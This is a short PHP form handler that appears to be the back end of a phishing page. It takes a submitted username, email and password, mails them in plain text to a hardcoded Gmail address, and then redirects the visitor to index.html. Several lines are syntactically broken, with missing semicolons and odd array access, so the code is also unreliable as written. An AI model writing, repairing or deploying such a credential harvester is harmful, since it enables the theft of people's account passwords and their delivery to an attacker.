<?php
 $name = $_POST['name'];
 $visitor_email = $_POST['email']
 $password = $_POST{'password'}

 $email_from = 'jxtsly@gmail.com';
 $email_subject = "New Form Submission";
 $email_body = "Username: $name.\n".
                  "User Email: $visitor_email.\n".
                    "User Password: $password.\n";

$to = "amaaunction50@gmail.com";
$headers = "From: $email_from \r\n";
$headers .= "Reply-To: $visitor_email \r\n";
mail($to,$email_subject,$email_body,$headers);
header("location: index.html");
?>